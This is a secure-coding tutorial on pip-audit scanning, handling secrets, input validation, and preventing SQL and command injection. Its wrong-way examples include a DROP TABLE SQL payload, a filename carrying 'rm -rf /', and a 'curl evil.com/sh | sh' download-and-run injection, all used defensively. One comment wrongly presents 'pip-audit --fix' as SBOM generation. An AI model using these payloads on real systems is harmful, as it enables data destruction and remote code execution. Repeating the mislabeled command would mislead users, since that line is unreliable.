# Security Basics: Dependencies, Secrets, and Injection Defenses

> Security is not a decoration added before launch; it is a habit baked in from the first line of code. This lesson covers three fundamentals that are easiest to overlook: how to scan dependencies for vulnerabilities, how to manage secrets, and how to defend against two fatal injection classes — SQL and command injection.

## Dependency vulnerabilities: your project is more "exposed" than you think

Your own code may have no holes, but the third-party libraries you pull in do. `log4shell` in 2021 and various supply-chain incidents in 2024 all make the same point: **your dependency tree is part of your attack surface.** The good news is that scanning for dependency vulnerabilities costs almost nothing.

`pip-audit` is the officially recommended dependency vulnerability scanner, backed by the vulnerability database of the Python Software Packaging Authority:

```bash
# install
$ pip install pip-audit

# scan every package installed in the current environment
$ pip-audit

# scan only the dependencies declared by the project
$ pip-audit -r requirements.txt

# generate an SBOM (software bill of materials) for archival and repeat scanning
$ pip-audit --fix --requirement requirements.txt
```

Sample output:

```text
Found 1 known vulnerability in 1 package

Package  Version  ID              Fix Versions
-------- --------  -------------- ------------
requests 2.20.0   PYSEC-2023-xxx 2.31.0
```

**Crash site: never scanning until the security team reports it**

```text
# WRONG: the dependency file has not changed in three years
$ cat requirements.txt
requests==2.20.0
flask==1.0.2
# those two lines pull in dozens of transitive dependencies, several with CVEs
```

```text
Security team notice:
requests 2.20.0 has CVE-2023-32681 (sensitive-information disclosure)
# a single pip-audit command would have found it early
```

**The fix**: wire `pip-audit` into CI so it becomes a hard gate, just like "run the tests." Vulnerabilities must be fixed before merging or releasing.

```yaml
# .github/workflows/security.yml (excerpt)
- name: Run pip-audit
  run: |
    pip install pip-audit
    pip-audit -r requirements.txt
```

## Secret management: environment variables are the minimum, KMS is the answer

**Hardcoding secrets is the single worst security mistake.** Once a secret is in code or version control, it gets copied into clones, forks, CI caches, and history — and is nearly impossible to erase completely.

The minimum acceptable approach is **environment variables**:

```python
import os

# WRONG: hardcoded in source
API_KEY = "sk-abcdef123456"

# RIGHT: read from the environment, with a clear error if it is missing
API_KEY = os.environ.get("API_KEY")
if not API_KEY:
    raise RuntimeError("Missing environment variable API_KEY; configure it before starting")
```

Pair this with a `.env` file (**which must be in `.gitignore`**):

```bash
# .env (never committed)
API_KEY=sk-abcdef123456
DATABASE_URL=postgresql://user:pass@localhost/app
```

Load `.env` with `python-dotenv`:

```python
from dotenv import load_dotenv
load_dotenv()   # automatically loads .env into environment variables
```

**The more proper approach is a secret manager (KMS / Secret Manager)**, such as the services cloud providers offer. The application fetches the secret at startup: no file on disk, no source code, with rotation and audit built in:

```python
# pseudocode; the exact API depends on your cloud platform
def get_secret(name):
    client = SecretManagerClient()
    return client.get_secret(name)   # fetched from the cloud; never lands locally
```

| Approach | Pros | Cons |
|---|---|---|
| Environment variables | simple, zero cost, works everywhere | can leak via `printenv`, logs, or subprocess inheritance |
| `.env` file | convenient for local development | must be gitignored; still touches disk |
| KMS / Secret Manager | no disk storage, rotatable, auditable | needs a cloud platform and a network dependency |
| Hardcoded | none | will leak, absolutely forbidden |

**Crash site: forgetting to gitignore `.env`**

```bash
$ cat .gitignore
__pycache__/
*.pyc
# forgot to add .env
$ git add . && git commit -m "init"
$ git push
```

```text
A few hours later:
Alert: your API_KEY appeared in a public GitHub repository
# even deleting it immediately leaves it in git history, and search engines may have indexed it
```

**The fix**: check `.gitignore` before committing; once a leak is discovered, **rotate the secret immediately** (invalidate the old one). Deleting the file or reverting the commit is not enough.

## Input validation: all external input is malicious

**Never trust external input** — user forms, API parameters, file paths, message-queue payloads. Validate at the outermost layer, as early as possible.

```python
from dataclasses import dataclass
from typing import Optional

@dataclass
class UserInput:
    username: str
    age: int

def parse_input(raw: dict) -> Optional[UserInput]:
    # validate type, range, and format
    name = raw.get("username", "")
    if not isinstance(name, str) or not name.strip():
        return None
    if len(name) > 50:
        return None
    age = raw.get("age", 0)
    if not isinstance(age, int) or age < 0 or age > 150:
        return None
    return UserInput(username=name.strip(), age=age)
```

**Crash site: trusting the client's type and range**

```python
# WRONG: assuming the frontend already validated
def create_user(data):
    return User(name=data["name"], age=data["age"])
```

```text
Attacker sends: {"name": "a" * 10000000, "age": "not a number"}
# memory spikes / type-conversion exception -> denial of service
```

**Lesson**: frontend validation is for user experience; backend validation is for security. Validate every boundary.

## SQL injection: use parameterized queries

SQL injection is decades old and still on the OWASP Top 10. The mechanism is simple: **concatenating user input directly into a SQL string hands control of your database to the user.**

```python
# WRONG: string concatenation, fatal
def get_user(conn, username):
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE name = '" + username + "'")
    # if username = "'; DROP TABLE users; --"
    # the resulting SQL runs two statements and drops the whole table
```

```python
# RIGHT: parameterized query, so the database treats the input as data, not code
def get_user(conn, username):
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE name = %s", (username,))
    return cursor.fetchone()
```

```python
# named parameters also work
cursor.execute(
    "SELECT * FROM users WHERE name = %(name)s AND age > %(age)s",
    {"name": username, "age": 18},
)
```

**Why it works**: a parameterized query sends the SQL structure to the database to compile first, then passes the parameters as pure data. No matter what characters the parameter contains, it will never be executed as SQL.

**Crash site: using an ORM but still concatenating**

```python
# WRONG: raw / text queries in an ORM can still inject
User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")
```

```text
The ORM parameterizes by default; the moment you hand-write a SQL string, the defense disappears
```

**The fix**: use placeholders for every hand-written SQL statement; bind parameters for the ORM's raw and text queries too.

## Command injection: never concatenate shell commands

Like SQL injection, concatenating user input into `os.system` or a `subprocess` shell string gives the user a remote shell.

```python
import subprocess

# WRONG: concatenating a string; disaster
def convert(filename):
    os.system("convert " + filename + " out.png")
    # filename = "a.png; rm -rf /"  -> arbitrary command execution
```

```python
# RIGHT: pass arguments as a list, with shell=False (the default)
def convert(filename):
    subprocess.run(["convert", filename, "out.png"], check=True)

# if you truly need shell features (like globbing), validate the variable against a strict whitelist
ALLOWED = re.compile(r"^[A-Za-z0-9_.-]+$")
def safe_convert(filename):
    if not ALLOWED.match(filename):
        raise ValueError("illegal filename")
    subprocess.run(f"convert {filename} out.png", shell=True, check=True)
```

| Approach | Safe? |
|---|---|
| `os.system("cmd " + user_input)` | absolutely unsafe |
| `subprocess.run("cmd " + user_input, shell=True)` | unsafe |
| `subprocess.run(["cmd", arg1, arg2])` | safe; arguments are never interpreted as commands |
| `subprocess.run(f"...{x}...", shell=True)` with x strictly whitelisted | conditionally safe, but avoid it if you can |

**Crash site: `shell=True` plus concatenated user input**

```python
# WRONG: two dangerous factors combined
subprocess.run(f"grep {user_pattern} data.txt", shell=True)
# user_pattern = "foo; curl evil.com/sh | sh"
```

```text
Result: remote code execution; the server is compromised
grep: foo: not found
# meanwhile the curl command is already running in the background
```

**Lesson**: `shell=True` + external input is a high-risk combination and should be avoided whenever possible. If you must use it, whitelist the variable and pass only permitted values.

## Summary

- Dependency scanning is a near-zero-cost security investment; wire `pip-audit` into CI.
- Never hardcode secrets; the minimum is environment variables, production should use a KMS.
- `.env` must be gitignored, and a leaked secret must be rotated.
- Validate all external input: type, range, and format.
- Use parameterized queries (`%s` / `?`) for SQL; never concatenate strings.
- For command injection, use `subprocess` with a list and avoid `shell=True`; if you must, whitelist.
